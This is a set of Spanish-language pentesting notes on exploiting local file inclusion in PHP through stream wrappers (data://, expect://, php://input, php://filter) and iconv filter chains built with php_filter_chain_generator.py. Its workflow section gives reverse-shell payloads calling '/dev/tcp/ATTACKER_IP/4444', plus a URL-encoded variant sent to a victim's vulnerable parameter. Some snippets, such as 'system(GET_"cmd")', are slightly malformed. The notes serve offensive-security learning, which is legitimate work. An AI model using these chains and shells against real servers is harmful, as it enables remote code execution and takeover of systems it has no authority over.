
---
Tags: #Explotacion #exploitation #lfi #chains #python #php_filter_chain_generator #web 

---
# 🐚 PHP Wrappers & Filter Chains – Apuntes Detallados

Este bloque reúne **todos los wrappers PHP** más útiles para LFI/RCE y la **herramienta `php_filter_chain_generator.py`**, con sus parámetros, cadenas recomendadas y metodología de uso.

---

## 📋 1. Tabla de Wrappers PHP

| Wrapper                                            | Acción / Descripción                                                                                                                                       |
|----------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|
| `data://text/plain;base64,<BASE64>`                | Inyecta contenido Base64 → decodifica → trata como PHP. Permite ejecutar código sin crear archivos.                                                        |
| `expect://<bin>?<cmd>`                             | Llama al binario del sistema (`/usr/bin/bash`, `whoami`, etc.) y ejecuta el comando. Ideal para RCE directo.                                                |
| `php://input`                                      | Lee el cuerpo de la petición HTTP como código PHP. Envío POST con `-d '<?php … ?>'`.                                                                         |
| `php://filter/read=string.rot13/resource=<file>`   | Aplica ROT13 al contenido del archivo, luego hay que decodificarlo cliente. Útil para evadir filtros básicos.                                              |
| `php://filter/convert.base64-encode/resource=<file>` | Codifica en Base64 el contenido del archivo; decodificar con `base64 -d`.                                                                                   |
| `php://filter/convert.iconv.<FROM>.<TO>/resource=<file>` | Transcodifica entre codificaciones (UTF‑8 → UTF‑7, ISO8859‑1 → UTF‑16…). Permite ocultar PHP con iconv.                                                        |
| `zip://<zipfile>#<file>`                           | Lee un archivo dentro de un ZIP local sin descomprimirlo manualmente.                                                                                       |
| `phar://<pharfile>`                                | Incluye un PHAR; si contiene objetos serializados, puede disparar gadgets de deserialización y ejecución.                                                  |
| `compress.zlib://<file>`                           | Descomprime on‑the‑fly contenido comprimido con zlib. Útil si el LFI apunta a logs comprimidos.                                                            |
| `php://temp`, `php://memory`                       | Streams en memoria o temporales. Combinados con filter chains para ejecutar payloads sin archivos físicos.                                                 |

---

## 🔧 2. Herramienta `php_filter_chain_generator.py`

Genera automáticamente **filter chains** que combinan múltiples filtros PHP para ocultar y luego restaurar tu payload en memoria.

### ⚙️ Parámetros principales

| Parámetro         | Descripción                                                                                                  |
|-------------------|--------------------------------------------------------------------------------------------------------------|
| `--chain CHAIN`   | El contenido PHP que quieres ejecutar. Ej: `--chain '<?php system("id"); ?>  '`.                                 |
| `--rawbase64 RAW` | (Opcional) Una cadena Base64 para depuración; muestra cómo se antepone/prepende en la chain.                  |
| `-h`, `--help`    | Muestra ayuda y uso del script.                                                                               |

### 🚀 Flujo de uso

1. **Preparar payload**:  
   ```bash
   PAYLOAD='<?php system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"); ?>  '
```
 o:
```bash
PAYLOAD='<?php system(GET_"cmd"); ?>'
```
2. **Generar filter chain**:
    ```bash
python3 php_filter_chain_generator.py --chain "$PAYLOAD"    
```
    
3. **Copiar URL**:  
    Obtendrás algo como:
```bash
php://filter/   convert.iconv.UTF8.CSISO2022KR|   convert.base64-encode|   convert.iconv.UTF8.UTF7|   …|   convert.base64-decode /resource=php://temp
```

4. **Enviar petición**:
```bash
http://victim/vuln.php?file=php://filter/…/resource=php://temp
```

- Opción 2:
```html
	http://victim/vuln.php?file=php://filter/…/resource=php://temp&cmd=bash -c "bash -i >%26 /dev/tcp/IPATACANTE/4444 0>%261"
```

[!info] El %26 es un "&" urlencoded

---
## 🛠️ 3. Cadenas (Chains) Más Usadas

|Carácter o Etapa|Filtro / Chain Ejemplo|Función|
|---|---|---|
|**0**|`convert.iconv.UTF8.UTF16LE`|UTF‑8 → UTF‑16LE|
|**C**|`convert.iconv.UTF8.CSISO2022KR`|UTF‑8 → CSISO2022KR|
|**w**|`convert.iconv.MAC.UTF16`|UTF‑16 (Mac) → UTF‑8|
|**base64-encode**|`convert.base64-encode`|Aplica Base64|
|**base64-decode**|`convert.base64-decode`|Quita capa de Base64|
|**UTF7**|`convert.iconv.UTF8.UTF7`|UTF‑8 → UTF‑7|
|**ROT13**|`read=string.rot13`|Aplica ROT13|
|**chaining multi-iconv**|Varias `convert.iconv.A.B|convert.iconv.C.D|
|**resource=php://temp**|`/resource=php://temp`|Stream en memoria donde se escribe y luego se incluye|

> [!tip] Las chains cortas (~5 filtros) a veces funcionan mejor en aplicaciones con límites de URL.

---

## 📖 4. Funcionamiento Interno de un Filter Chain

1. **Entrada**:  
    Stream vacío `php://temp`.
    
2. **Filtro-1**: iconv convierte bytes → bytes distintos (oculta texto).
    
3. **Filtro-2**: Base64-encode codifica texto en “A–Z0–9+/”.
    
4. **Filtro-3**: Otro iconv convierte esos caracteres a otro set.
    
5. … (N pasos):
    
6. **Filtro-final**: base64-decode → recupera el payload original (`<?php … ?>`).
    
7. **Include**: PHP interpreta el contenido del stream como script y lo ejecuta.
    

---

## 🚧 5. Bypass & Buenas Prácticas

- **Espacios al final del payload**: Algunos filtros requieren padding.
    
- **Prueba combinaciones**: Cambia orden de `iconv` y `base64` según límites de la aplicación.
    
- **URL-encode**: Escapa caracteres `|`, `/`, `+`, etc., con `%7C`, `%2F`, `%2B`.
    
- **Verifica wrappers habilitados**: Usa `phpinfo()` o `php://filter/convert.base64-encode/resource=phpinfo.php`.
    
- **Chains mínimas**: Empieza con pocas etapas y aumenta si no funciona.
    

---

## ✅ 6. Resumen de Wrappers, Chains y Uso

|Wrapper / Chain|Tipo|Utilidad|
|---|---|---|
|`data://text/plain;base64,…`|Wrapper|Inyecta Base64 → PHP|
|`expect://<bin>?<cmd>`|Wrapper|RCE directo usando binarios del SO|
|`php://input`|Wrapper|Incluye POST body como PHP|
|`php://filter/read=string.rot13/...`|Wrapper|ROT13 + decode manual|
|`convert.base64-encode` / `decode`|Chain step|Añade/quita capa Base64|
|`convert.iconv.X.Y`|Chain step|Transcodifica entre codificaciones|
|`php://filter/.../resource=php://temp`|Wrapper+Chain|Ejecuta filter chain en memoria para RCE sin archivos|